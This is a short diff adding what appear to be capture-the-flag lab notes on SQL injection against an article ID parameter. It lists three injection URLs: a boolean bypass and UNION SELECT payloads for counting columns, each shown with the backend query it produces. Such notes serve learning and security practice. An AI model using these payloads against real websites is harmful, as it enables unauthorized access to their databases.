@@ -1,1 +1,10 @@
+1.https://kgy9amx2.eu2.ctfio.com/article?id=0' or id = 2;--   
+# query for the above: select * from articles where released=1 and id='0' or id = 2;-- '
 
+2.https://kgy9amx2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,4;--
+# query for the above select * from articles where released=1 and id='0' UNION SELECT 1,2,3,4;--'
+
+
+3.https://kgy9amx2.eu2.ctfio.com/article?id=0' UNION SELECT 1,2,3,'hello';--'
+# query for the above select * from articles where released=1 and id='0' UNION SELECT 1,2,3,'hello';--''
+# 1,2,3,4 is to count columns. A string can replace an integer
